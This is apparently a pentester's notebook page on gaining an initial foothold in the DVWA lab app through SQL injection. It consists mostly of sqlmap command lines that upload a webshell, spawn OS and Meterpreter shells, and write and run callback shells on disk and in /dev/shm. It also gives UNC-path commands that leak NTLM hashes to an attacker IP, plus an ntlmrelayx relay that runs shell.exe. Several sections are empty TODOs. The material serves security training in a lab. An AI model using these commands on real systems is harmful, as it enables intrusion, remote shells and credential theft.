# 04 - Initial Foothold

#sqli #sqlmap #initial-foothold

## 4.1 - Webshell

### 4.1.1 - Upload a specific Webshell

Refer to this [[Pentesting Phases/Initial Access/Callback Shells/Webshells|link]] to generate interactive weevely webshells and click [[Weevely|here]] for post exploitation section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --file-write="/path/to/webshell.php" --file-dest="/var/www/html/dvwa/shell.php"
```

### 4.1.2 - Spawn an Interactive Webshell

TODO: Provide **\[INFO\]** logs and a screenshot to demonstrate a different between a file web stager (the uploader file) and a backdoor (an interactive shell)

Great thing about SQLMap that not only it uploads an interactive **web backdoor (the webshell)** it also comes with the **web file stager (the uploader)**.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-shell --web-root="/var/www/html/dvwa/"
```

### 4.1.3 - Spawn a Meterpreter Shell

- Start a shell handler listener in Metasploit to retrieve a callback meterpreter session.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-pwn --web-root="/var/www/html/dvwa/"
```

Note: when using the `--priv-esc` flag this is for targeting Windows operating systems to automate using the `getsystem` function for impersonation.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --random-agent --os-pwn --web-root="/var/www/html/dvwa/" --priv-esc
```
### 4.1.4 - Execute OS Command

#### 4.1.4.1 - General

- Execute any command

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="whoami"
```

#### 4.1.4.2 - Linux

- Execute the callback shell in disk

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-write="/path/to/shell.py" --file-dest="/tmp/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="python /tmp/shell.py"
```

- Execute the callback shell in memory (fileless memory)

1. Copy the file in `/dev/shm/` directory

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-write="/path/to/shell.py" --file-dest="/dev/shm/shell.py"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="python /dev/shm/shell.py"
```

2. Execute a one liner

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="python -c <payload>"
```

#### 4.1.4.3 - Windows

TODO: Fill in this info to test a windows environment

##### 4.1.4.3.1 - Grab NTLM hashes (Out-of-band)

^d00739

- Run [[Pentesting Phases/Initial Access/Sniffing and Spoofing/Passive/Responder|Responder]] to grab the NTLM hashes. This also can be done with [[Pentesting Phases/Initial Access/Sniffing and Spoofing/Active/Metasploit#^0c8cfd|metasploit SMB relay auxiliary module]].

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="dir \\\\<attacker_IP>\\snare.txt"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --os-cmd="net view \\\\<attacker_IP>\\snare.txt"
```

- Responder

```

```

- Metasploit Framework

```

```
##### 4.1.4.3.2 - SMB Relay Callback Shell

- Repeat the [[Pentesting Phases/WebApp Hacking/Injection/SQL Injection/01 - In-Band SQL Injection/DVWA/Difficulty/Low/SQLMap#^d00739|previous step]] and launch [[Impacket|ntlmrelayx]] with [[Pentesting Phases/Initial Access/Sniffing and Spoofing/Active/Responder/Usage|Responder]] to receive a callback shell connection. This can be done with [[Pentesting Phases/Initial Access/Sniffing and Spoofing/Active/Metasploit#^c109ec|metasploit SMB relay exploit module]].

```
$ sudo impacket-ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe
```

## References

- [Hacking Articles: File System Access on Webserver Using SQLmap](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/)

- [Hacking Articles: Shell uploading in Web Server using Sqlmap](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/)
- [Hacking Articles: Command Injection Exploitation through Sqlmap in DVWA (OS-cmd)](https://www.hackingarticles.in/command-injection-exploitation-through-sqlmap-in-dvwa/)

- [IOSec: SQLmap](https://iosec.in/sqlmap-4/)

- [Executing OS Commands Through MySQL](https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql)

- [Hacking Articles: Exploiting the Webserver using Sqlmap and Metasploit (OS-Pwn)](https://www.hackingarticles.in/exploiting-webserver-using-sqlmap-metasploit-os-pwn/)

- [MySQL Out-of-Band Hacking](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)